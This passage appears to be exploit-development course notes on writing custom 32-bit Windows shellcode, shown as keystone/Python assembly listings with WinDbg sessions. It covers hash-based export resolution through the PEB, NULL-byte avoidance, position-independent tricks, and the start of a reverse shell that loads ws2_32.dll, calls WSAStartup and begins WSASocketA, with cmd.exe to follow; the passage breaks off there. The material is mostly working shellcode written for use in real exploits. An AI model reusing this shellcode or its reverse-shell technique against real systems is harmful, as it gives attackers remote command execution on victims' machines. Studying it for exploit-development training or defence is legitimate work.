+    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
+    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
+
+    " find_function_loop:                "  #
+    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
+    "   dec   ecx                       ;"  #   Decrement our names counter
+    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
+    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
+    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
+
+    " compute_hash:                      "  #
+    "   xor   eax, eax                  ;"  #   NULL EAX
+    "   cdq                             ;"  #   NULL EDX
+    "   cld                             ;"  #   Clear direction
+
+    " compute_hash_again:                "  #
+    "   lodsb                           ;"  #   Load the next byte from esi into al
+    "   test  al, al                    ;"  #   Check for NULL terminator
+    "   jz    compute_hash_finished     ;"  #   If the ZF is set,we've hit the NULL term
+    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
+    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
+    "   jmp   compute_hash_again        ;"  #   Next iteration
+
+    " compute_hash_finished:             "  #
+
+    " find_function_compare:             "  #
+    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
+    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
+    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
+    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
+    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
+    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
+    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
+    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
+    "   add   eax, ebx                  ;"  #   Get the function VMA
+    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
+
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+)
+...
+```
+
+The `start` function:
+
+- Before the call to `find_function`, push the hash `0x78b5b983` for `TerminateProcess` on the stack. => to later fetch it from the stack and compare it to the hash generated by our `compute_hash_again` function.
+
+- After `find_function` returns, push the 2 arguments that the target function `TerminateProcess` requires on the stack, and call it using an indirect call to `EAX`. Place the `VMA` of `TerminateProcess` in `EAX` before returning from `find_function`.
+
+`find_function_compare` function
+
+- Makes a comparison between `EDX` and the value pointed to by `ESP` at offset `0x24`, i.e. the pre-generated hash we pushed.
+
+- If the compared hashes don't match, jump back to `find_function_loop` and grab the next entry in the `AddressOfNames` array.
+
+- Once we have found the correct entry, gather the `RVA` of the `AddressOfNameOrdinals` array at offset `0x24` from the `Export Directory Table`, which is stored in `EDI`.
+
+- Adds the base address of `kernel32.dll` stored in `EBX` to the `RVA` of `AddressOfNameOrdinals`.
+
+- The `mov cx, [edx+2*ecx]` instruction. Because the `AddressOfNames` and `AddressOfNameOrdinals` arrays entries use the same counter/index `ecx`. We multiply `ECX` by `0x02` because each entry in the array is a `WORD`.
+
+- Before using the new index, we gather the `RVA` of `AddressOfFunctions` at offset `0x1C` from the `Export Directory Table` (`mov edx, [edi+0x1c]`), and then add the base address of `kernel32.dll` to it.
+
+- Using our new index in the `AddressOfFunctions` array, retrieve the `RVA` of the function and then finally add the base address of `kernel32.dll` to obtain the `VMA` of the function.
+
+Set a software breakpoint after the conditional jump inside `find_function_compare`:
+
+`bp 02b40070` 
+
+`g`
+
+```
+Breakpoint 0 hit
+02b40070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76eb5964=00078a70
+```
+
+`u @eip La`
+
+```
+02b40070 8b5724          mov     edx,dword ptr [edi+24h]
+02b40073 01da            add     edx,ebx
+02b40075 668b0c4a        mov     cx,word ptr [edx+ecx*2]
+02b40079 8b571c          mov     edx,dword ptr [edi+1Ch]
+02b4007c 01da            add     edx,ebx
+02b4007e 8b048a          mov     eax,dword ptr [edx+ecx*4]
+02b40081 01d8            add     eax,ebx
+02b40083 8944241c        mov     dword ptr [esp+1Ch],eax
+02b40087 61              popad
+02b40088 c3              ret
+```
+
+`t`
+
+```
+02b40073 01da            add     edx,ebx
+```
+
+`t`
+
+```
+02b40083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:02d3fd4c=fa5da212
+```
+
+`u @eax`
+
+```
+KERNEL32!TerminateProcessStub:
+76e6bd30 8bff            mov     edi,edi
+76e6bd32 55              push    ebp
+76e6bd33 8bec            mov     ebp,esp
+76e6bd35 5d              pop     ebp
+76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
+76e6bd3c cc              int     3
+76e6bd3d cc              int     3
+76e6bd3e cc              int     3
+```
+
+Our shellcode managed to successfully resolve the memory address of `TerminateProcess`.
+
+The last instruction in `find_function_compare` will write this `VMA` to the stack at offset `0x1C`.
+
+=> To ensure that our address will be popped back into `EAX` after executing the `POPAD` instruction that is a part of `find_function_finished` before returning to our start function.
+
+Inspect the `TerminateProcess` function prototype:
+
+```C
+BOOL TerminateProcess(
+  HANDLE hProcess,
+  UINT   uExitCode
+);
+```
+
+After the `RET` instruction is executed, we return to the `start` function where we:
+
+- zero out `ECX` and push it onto the stack as the `uExitCode` parameter and represents a successful exit.
+
+- pushes the value `-1` (`0xFFFFFFFF`) to the stack as the `hProcess` parameter. The minus one value represents a `pseudo-handle` to our process.
+
+## NULL-Free Position-Independent Shellcode (PIC)
+
+While our shellcode is functioning correctly, the opcodes it generates contain NULL bytes:
+
+`u @eip L6`
+
+```
+02950000 cc              int     3
+02950001 89e5            mov     ebp,esp
+02950003 81ec00020000    sub     esp,200h
+02950009 e811000000      call    0295001f
+0295000e 6883b9b578      push    78B5B983h
+02950013 e822000000      call    0295003a
+```
+
+Using this shellcode in a real exploit would be problematic as the NULL byte is usually a **bad character**.
+
+### Avoiding NULL Bytes
+
+Instructions that generated the `NULL` bytes: `sub esp, 0x200`
+
+=> use a **negative offset value**, or a combination of multiple instructions that achieve the same effect
+
+`? 0x0 - 0x210`
+
+```
+Evaluate expression: -528 = fffffdf0
+```
+
+`? @esp + 0xfffffdf0`
+
+```
+Evaluate expression: 4340382624 = 00000001`02b4fba0
+```
+
+`r @esp`
+
+```
+esp=02b4fdb0
+```
+
+`? 0x02b4fdb0 - 0x02b4fba0`
+
+```
+Evaluate expression: 528 = 00000210
+```
+
+Rather than using a `SUB` operation with a value of `0x200`, we can `ADD` a large offset and achieve a similar result.
+
+make `ESP` hold a memory address that will not contain any `NULL` bytes.
+
+```python
+import ctypes, struct
+from keystone import *
+
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes
+    "   call  find_kernel32             ;"  #
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash
+    "   call  find_function             ;"  #
+...
+```
+
+Verify the opcodes do not contain `NULL` bytes:
+
+`u @eip L6`
+
+```
+02210000 cc              int     3
+02210001 89e5            mov     ebp,esp
+02210003 81c4f0fdffff    add     esp,0FFFFFDF0h
+02210009 e811000000      call    0221001f
+0221000e 6883b9b578      push    78B5B983h
+02210013 e822000000      call    0221003a
+```
+
+Our shellcode also contains `CALL` instructions, which generate `NULL` bytes.
+
+### Position-Independent Shellcode
+
+Our `CALL` instructions generate `NULL` bytes because our code is calling the functions directly.
+
+Each direct function `CALL`, depending on the location of the function, will either invoke a
+
+- **near call** containing a **relative offset** to the function, or
+
+- **far call** containing the **absolute address**, either directly or with a pointer.
+
+There are 2 ways we can address the `CALL` instructions.
+
+1. Move all the functions being called above the `CALL` instruction. This would generate a **negative offset** and avoid `NULL` bytes.
+
+2. Dynamically gather the absolute address of the function we want to call, and store it in a register.
+
+The 2nd option provides more flexibility, especially for large shellcodes. This technique is often used by decoder components when the payload is encoded. The ability to gather the shellcode absolute address at runtime will provide us with a position independent code (PIC) shellcode that is both NULL-free and injectable anywhere in memory.
+
+This technique exploits the fact that a call to a function located in a lower address will use a **negative offset** and therefore has a high chance of not containing `NULL` bytes. Moreover, when executing the CALL instruction, the return address will be pushed onto the stack. This address can be then popped from the stack into a register and be used to dynamically calculate the absolute address of the function we are interested in.
+
+`resolving_symbols_0x04.py`: Obtaining the location of our shellcode in memory
+
+```python
+...
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes
+
+    " find_kernel32:                     "  #
+    "   xor   ecx, ecx                  ;"  #   ECX = 0
+    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
+    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
+    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder
+
+    " next_module:                       "  #
+    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
+    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
+    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
+    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
+    "   jne   next_module               ;"  #   No: try next module
+
+    " find_function_shorten:             "  #
+    "   jmp find_function_shorten_bnc   ;"  #   Short jump
+
+    " find_function_ret:                 "  #
+    "   pop esi                         ;"  #   POP the return address from the stack
+    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
+    "   jmp resolve_symbols_kernel32    ;"  #
+
+    " find_function_shorten_bnc:         "  #   
+    "   call find_function_ret          ;"  #   Relative CALL with negative offset
+
+    " find_function:                     "  #
+    "   pushad                          ;"  #   Save all registers
+                                            #   Base address of kernel32 is in EBX from 
+                                            #   Previous step (find_kernel32)
+    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
+    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
+    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
+    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
+    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
+    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
+    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later
+
+    " find_function_loop:                "  #
+    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
+    "   dec   ecx                       ;"  #   Decrement our names counter
+    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
+    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
+    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
+
+    " compute_hash:                      "  #
+    "   xor   eax, eax                  ;"  #   NULL EAX
+    "   cdq                             ;"  #   NULL EDX
+    "   cld                             ;"  #   Clear direction
+
+    " compute_hash_again:                "  #
+    "   lodsb                           ;"  #   Load the next byte from esi into al
+    "   test  al, al                    ;"  #   Check for NULL terminator
+    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
+    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
+    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
+    "   jmp   compute_hash_again        ;"  #   Next iteration
+
+    " compute_hash_finished:             "  #
+
+    " find_function_compare:             "  #
+    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
+    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
+    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
+    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
+    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
+    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
+    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
+    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
+    "   add   eax, ebx                  ;"  #   Get the function VMA
+    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad
+
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+
+    " resolve_symbols_kernel32:              "
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
+
+    " exec_shellcode:                    "  #
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   push  ecx                       ;"  #   uExitCode
+    "   push  0xffffffff                ;"  #   hProcess
+    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
+)
+...
+```
+
+Modified `start` function:
+
+- Go directly into the `find_kernel32` function without using a `CALL` instruction.
+
+After obtaining the base address of `kernel32.dll`, reach the newly added functions which will gather the position of our shellcode in memory.
+
+`find_function_shorten` function contains a single assembly instruction, which is a short jump to `find_function_shorten_bnc`.
+
+Because these functions are close to each other, the `JMP` instruction's opcodes will not contain `NULL` bytes.
+
+```python
+    " find_function_shorten:             "  #
+    "   jmp find_function_shorten_bnc   ;"  #   Short jump
+
+    " find_function_ret:                 "  #
+    "   pop esi                         ;"  #   POP the return address from the stack
+    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
+    "   jmp resolve_symbols_kernel32    ;"  #
+
+    " find_function_shorten_bnc:         "  #   
+    "   call find_function_ret          ;"  #   Relative CALL with negative offset
+
+    " find_function:                     "  #
+    "   pushad                          ;"  #   Save all registers
+```
+
+`find_function_shorten_bnc` function:
+
+- A `CALL` instruction with `find_function_ret` as the destination.
+
+- Because this function is located higher than our `CALL` instruction, the generated opcodes will contain a **negative offset** that should be free of `NULL` bytes.
+
+After we execute this `CALL` instruction, we will push the **return address** to the stack. The stack will point to `find_function`'s 1st instruction.
+
+`find_function_ret` function:
+
+- The 1st instruction is a `POP`, which takes the return value we pushed on the stack and places it in `ESI`. `ESI` will point to the first instruction of `find_function`, allowing us to use an indirect call to invoke it.
+
+- This address is then saved at a dereference of `EBP` at offset `0x04` for later use.
+
+```python
+...
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+
+    " resolve_symbols_kernel32:              "
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
+
+    " exec_shellcode:                    "  #
+    "   xor   ecx, ecx                  ;"  #   Null ECX
+    "   push  ecx                       ;"  #   uExitCode
+    "   push  0xffffffff                ;"  #   hProcess
+    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess
+```
+
+Moving the functions requires us to move the assembly code responsible for calling `find_function` to resolve symbols and execute the APIs after `find_function_finished`.
+
+Setting a breakpoint right at `find_function_shorten`. Once hit, we will take the jump and reach `find_function_shorten_bnc`:
+
+`g`
+
+```
+02900000 cc              int     3
+```
+
+`u @eip L10`
+
+```
+...
+02900023 eb06            jmp     0290002b
+02900025 5e              pop     esi
+02900026 897504          mov     dword ptr [ebp+4],esi
+02900029 eb54            jmp     0290007f
+```
+
+`bp 02900023`
+
+`g`
+
+```
+Breakpoint 0 hit
+02900023 eb06            jmp     0290002b
+```
+
+`t`
+
+```
+0290002b e8f5ffffff      call    02900025
+```
+
+The `CALL` instruction does not contain any NULL bytes due to the negative offset.
+
+Stepping into the call will push the return instruction on the stack. Let's confirm that the return address points to `find_function`.
+
+`t`
+
+```
+02900025 5e              pop     esi
+```
+
+`dds @esp L1`
+
+```
+02aff95c  02900030
+```
+
+`u poi(@esp)`
+
+```
+02900030 60              pushad
+02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
+02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
+02900038 01df            add     edi,ebx
+0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
+0290003d 8b4720          mov     eax,dword ptr [edi+20h]
+02900040 01d8            add     eax,ebx
+02900042 8945fc          mov     dword ptr [ebp-4],eax
+```
+
+The return address is pushed to the stack and points to the 1st instruction of `find_function`.
+
+The next two instructions will `POP` the address of `find_function` into `ESI`, and save it at the memory location pointed to by `EBP` at offset `0x04`.
+
+`t`
+
+```
+02900026 897504          mov     dword ptr [ebp+4],esi ss:0023:02affb74=00000000
+```
+
+`u @esi`
+
+```
+02900030 60              pushad
+02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
+02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
+02900038 01df            add     edi,ebx
+0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
+0290003d 8b4720          mov     eax,dword ptr [edi+20h]
+02900040 01d8            add     eax,ebx
+02900042 8945fc          mov     dword ptr [ebp-4],eax
+```
+
+`t`
+
+```
+02900029 eb54            jmp     0290007f
+```
+
+`u poi(@ebp + 0x04)`
+
+```
+02900030 60              pushad
+02900031 8b433c          mov     eax,dword ptr [ebx+3Ch]
+02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
+02900038 01df            add     edi,ebx
+0290003a 8b4f18          mov     ecx,dword ptr [edi+18h]
+0290003d 8b4720          mov     eax,dword ptr [edi+20h]
+02900040 01d8            add     eax,ebx
+02900042 8945fc          mov     dword ptr [ebp-4],eax
+```
+
+The last instruction of `find_function_ret` is a short jump to the `resolve_symbols_kernel32` function, where we use an **indirect call** to avoid NULL bytes:
+
+`t`
+
+```
+0290007f 6883b9b578      push    78B5B983h
+```
+
+`t`
+
+```
+02900084 ff5504          call    dword ptr [ebp+4]    ss:0023:02affb74=02900030
+```
+
+`p`
+
+```
+02900087 894510          mov     dword ptr [ebp+10h],eax ss:0023:02affb80=02affbc8
+```
+
+`u @eax`
+
+```
+KERNEL32!TerminateProcessStub:
+76e6bd30 8bff            mov     edi,edi
+76e6bd32 55              push    ebp
+76e6bd33 8bec            mov     ebp,esp
+76e6bd35 5d              pop     ebp
+76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76ec494c)]
+76e6bd3c cc              int     3
+76e6bd3d cc              int     3
+76e6bd3e cc              int     3
+```
+
+The indirect call does not contain any `NULL` bytes.
+
+## Reverse Shell
+
+Publicly-available reverse shells written in C reveales most of the required APIs are exported by `Ws2_32.dll`.
+
+- Initialize the Winsock DLL using `WSAStartup`.
+- Call `WSASocketA` to create the socket,
+- Call `WSAConnect` to establish the connection.
+- Call `CreateProcessA` from `kernel32.dll`. This API will start `cmd.exe`.
+
+### Loading ws2_32.dll and Resolving Symbols
+
+- Resolve the `CreateProcessA` API (which is exported by `kernel32.dll`) and store the address for later use.
+
+- Load `ws2_32.dll` into the shellcode memory space and obtain its base address. Both of these tasks can be achieved using `LoadLibraryA`, which is exported by `kernel32.dll`.
+
+To resolve symbols from `ws2_32.dll`, we could use the `GetProcAddress` API from `kernel32.dll` or simply reuse the functions that we have implemented previously. The only requirement is that the base address of the module needs to be in the `EBX` register, so that `RVA` can be translated to `VMA`.
+
+Modify our current shellcode to load `ws2_32.dll` and resolve `LoadLibraryA` and `CreateProcessA` as part of the `resolve_symbols_kernel32` function
+
+```python
+    " find_function_finished:            "  #
+    "   popad                           ;"  #   Restore registers
+    "   ret                             ;"  #
+
+    " resolve_symbols_kernel32:          "
+    "   push  0x78b5b983                ;"  #   TerminateProcess hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
+    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
+    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
+...
+```
+
+Set up the call to `LoadLibraryA` (`ws2_32.dll` == `0x7773325f33322e646c6c`)
+
+```python
+    " resolve_symbols_kernel32:
+    ...
+
+    " load_ws2_32:                       "  #
+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
+    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
+    "   push  0x642e3233                ;"  #   Push part of the string on the stack
+    "   push  0x5f327377                ;"  #   Push another part of the string on the stack
+    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
+    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
+```
+
+- Set `EAX` to `NULL`.
+- Move the end of the `ws2_32.dll` string to the `AX` register and push it to the stack. This ensures that our string will be `NULL` terminated, while avoiding `NULL` bytes in our shellcode.
+- After 2 more `PUSH` instructions, the entire string is pushed to the stack.
+- Pushes the stack pointer (`ESP`) to the stack. Because `LoadLibraryA` requires a pointer to the string that is currently located on the stack.
+- Call `LoadLibraryA` and proceed into the `resolve_symbols_ws2_32` function.
+
+```python
+    " load_ws2_32:
+    ...
+
+    " resolve_symbols_ws2_32:            "
+    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
+    "   push  0x3bfcedcb                ;"  #   WSAStartup hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
+...
+```
+
+The return value of `LoadLibraryA` is a **handle** to the module specified as an argument. This handle comes in the form of the **base address** of the module. If the call to `LoadLibraryA` is successful, then we should have the base address of `ws2_32.dll` in the `EAX` register.
+
+`load_ws2_32` function:
+- Set the `EBX` register to the base address of `ws2_32.dll`.
+- Resuses our `find_function` implementation to resolve symbols from `ws2_32.dll`.
+
+With the base address of `ws2_32.dll` in EBX, push the individual hashes for every required symbol. i.e. `WSAStartup` and call `find_function` to resolve them.
+
+Set breakpoint at the 1st instruction of the `load_ws2_32` function:
+
+`g`
+
+```
+026000a0 31c0            xor     eax,eax
+```
+
+Proceed to single step through the instructions until we reach the call to `LoadLibraryA`.
+
+Before stepping over the call, verify the first argument pushed on the stack:
+
+`r`
+
+```
+026000b2 ff5514          call    dword ptr [ebp+14h]  ss:0023:027fff40={KERNEL32!LoadLibraryAStub (76e6a5c0)}
+```
+
+`da poi(esp)`
+
+```
+027ffd04  "ws2_32.dll"
+```
+
+`p`
+
+```
+026000b5 89c3            mov     ebx,eax
+```
+
+`r @eax`
+
+```
+eax=75070000
+```
+
+`lm m ws2_32`
+
+```
+Browse full module list
+start    end        module name
+75070000 750cb000   WS2_32     (deferred)            
+```
+
+Our argument is set up correctly before the call to `LoadLibraryA`.
+
+After we step over the call, notice that `ws2_32.dll` is now loaded in the memory space of our shellcode, and `EAX` contains its base address.
+
+Ensure that our `find_function` implementation works with `ws2_32.dll`.
+
+Hash of `WSAStartup` is `0x3bfcedcb`
+
+`t`
+
+```
+026000b7 68cbedfc3b      push    3BFCEDCBh
+```
+
+`t`
+
+```
+026000bc ff5504          call    dword ptr [ebp+4]    ss:0023:027fff30=02600030
+```
+
+`p`
+
+```
+026000bf 89451c          mov     dword ptr [ebp+1Ch],eax ss:0023:027fff48=cacdbf08
+```
+
+`u @eax`
+
+```
+WS2_32!WSAStartup:
+750825e0 8bff            mov     edi,edi
+750825e2 55              push    ebp
+750825e3 8bec            mov     ebp,esp
+750825e5 6afe            push    0FFFFFFFEh
+750825e7 6898fb0a75      push    offset WS2_32!StringCopyWorkerW+0x2fc (750afb98)
+750825ec 6850680875      push    offset WS2_32!_except_handler4 (75086850)
+750825f1 64a100000000    mov     eax,dword ptr fs:[00000000h]
+750825f7 50              push    eax
+```
+
+Our `find_function` implementation works correctly, even when using a different DLL.
+
+### Calling WSAStartup
+
+The 1st API we need to call is `WSAStartup` to initiate the use of the Winsock DLL by our shellcode.
+
+```C
+int WSAStartup(
+  WORD      wVersionRequired,
+  LPWSADATA lpWSAData
+);
+```
+
+The 1st parameter appears to be the version of the Windows Sockets specification. Set this parameter to `2.2`.
+
+The 2nd parameter is a pointer to the `WSADATA` structure. This structure will receive details about the Windows Sockets implementation. We need to reserve space for this structure
+
+=> Discover its **length** by going over its prototype and inspecting the size of each structure member.
+
+```C
+typedef struct WSAData {
+  WORD           wVersion;
+  WORD           wHighVersion;
+#if ...
+  unsigned short iMaxSockets;
+#if ...
+  unsigned short iMaxUdpDg;
+#if ...
+  char           *lpVendorInfo;
+#if ...
+  char           szDescription[WSADESCRIPTION_LEN + 1];
+#if ...
+  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
+#else
+  char           szDescription[WSADESCRIPTION_LEN + 1];
+#endif
+#else
+  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
+#endif
+#else
+  unsigned short iMaxSockets;
+#endif
+#else
+  unsigned short iMaxUdpDg;
+#endif
+#else
+  char           *lpVendorInfo;
+#endif
+} WSADATA;
+```
+
+Reviewing the structure definition and information on the Microsoft website (`https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata`), note that some of the members are no longer used if the version is higher than `2.0`.
+
+While most of the fields have defined lengths, there are a couple that remain problematic such as the `szDescription` and `szSystemStatus` fields.
+
+According to the official documentation, `szDescription` can have a maximum length of `257` (`WSADESCRIPTION_LEN`, which is `256` plus the string `NULL` terminator).
+
+Unfortunately, there is no mention of the length of the `szSystemStatus` field.
+
+There are 2 ways to determine the length of this field:
+
+- Code the socket in C and then inspect the structure inside WinDbg, or
+
+- Use online resources to determine the size of this field. E.g., the source code of **ReactOS**.
+
+ReactOS is an open-source OS designed to run Windows software and drivers. It uses a large number of structures that come from reverse-engineering older versions of the Windows OS.
+
+The source code of ReactOS tells us that the maximum length of the `szSystemStatus` field is 129 (`WSASYS_STATUS_LEN`, which is `128` plus the `NULL` terminator). (`https://doxygen.reactos.org/dd/d21/winsock2_8h.html#acc8153c87f4d00b6e4570c5d0493b38c`)
+
+Calculate the maximum length of the `WSADATA` structure:
+
+`? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1`
+
+```
+Evaluate expression: 398 = 0000018e
+```
+
+Modify our shellcode and subtract a higher value from `ESP` to account for the structure's size.
+
+```python
+import ctypes, struct
+from keystone import *
+
+CODE = (
+    " start:                             "  #
+    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+    "   mov   ebp, esp                  ;"  #
+    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes
+...
+    " call_wsastartup:                   "  #
+    "   mov   eax, esp                  ;"  #   Move ESP to EAX
+    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
+    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
+    "   push  eax                       ;"  #   Push lpWSAData
+    "   xor   eax, eax                  ;"  #   Null EAX
+    "   mov   ax, 0x0202                ;"  #   Move version to AX
+    "   push  eax                       ;"  #   Push wVersionRequired
+    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
+```
+
+The `call_wsastartup` function:
+
+- moving the memory address from `ESP`, which we used as a storage location for our resolved symbols, to the `EAX` register.
+
+- stores the `0x590` value in the CX register.
+
+- subtract the value of ECX (`0x590`) from EAX, which stores the stack pointer.
+
+- As part of the call to WSAStartup, the API will populate the WSADATA structure that is currently on the stack. Because of this, we need to ensure that later shellcode instructions do not overwrite the contents of this structure. One way of achieving this is by subtracting an arbitrary value (0x590) from the stack pointer and using that as storage for the structure.
+
+After the SUB operation, we'll push EAX to the stack. The next XOR instruction will zero out EAX and we will move the 0x0202 value to the AX register to act as the wVersionRequired argument.
+
+Finally, we can push this argument to the stack and call WSAStartup.
+
+
+
+`r`
+
+```
+029700e8 ff551c          call    dword ptr [ebp+1Ch]  ss:0023:02b6fac8={WS2_32!WSAStartup (750825e0)}
+```
+
+`dds @esp L2`
+
+```
+02b6f670  00000202
+02b6f674  02b6f0e8
+```
+
+`p`
+
+```
+eax=00000000
+029700eb 0000            add     byte ptr [eax],al          ds:0023:00000000=??
+```
+
+The return value of the function stored in `EAX` is `0`, which indicates a successful call according to the official documentation.
+
+### Calling WSASocket
+
+Invoke the `WSASocketA` API, which is responsible for creating the socket. 
+
+```C
+SOCKET WSAAPI WSASocketA(
+  int                 af,
+  int                 type,
+  int                 protocol,
+  LPWSAPROTOCOL_INFOA lpProtocolInfo,
+  GROUP               g,
+  DWORD               dwFlags
+);
+```
+
+There are 6 arguments required for the call. Most of these arguments have familiar data types such as INT and DWORD, but we'll also find some odd data types within the `lpProtocolInfo` and `g` parameters that require additional review:
+
+- The `af` parameter is the address family used by the socket. `AF_INET` (`2`) corresponds to the IPv4 address family.
+
+- The next parameter, `type`, specifies the socket type as its name implies. Our reverse shell will be going over the TCP, so we need to supply the `SOCK_STREAM` (`1`) argument for the socket type.
+
+- The `protocol` parameter is based on the previous 2 arguments supplied to the function. Set to `IPPROTO_TCP` (`6`).
+
+- The `lpProtocolInfo` parameter seems to require a pointer to the `WSAPROTOCOL_INFO` structure. This parameter can be set to `NULL` (`0x0`). If set to `null`, Winsock will use the first transport-service provider, which matches our other parameters. Because we are using standard protocols in our reverse shell (TCP/IP).
+
+- The `g` parameter. This parameter is used for specifying a socket group ID. Since we are creating a single socket, we can set this value to `NULL` as well.
+
+- The `dwFlags` parameter is used to specify additional socket attributes. Because we do not require any additional attributes for our current shellcode, we will also set this value to `NULL`.
+
+
+```python
+    " call_wsasocketa:                   "  #
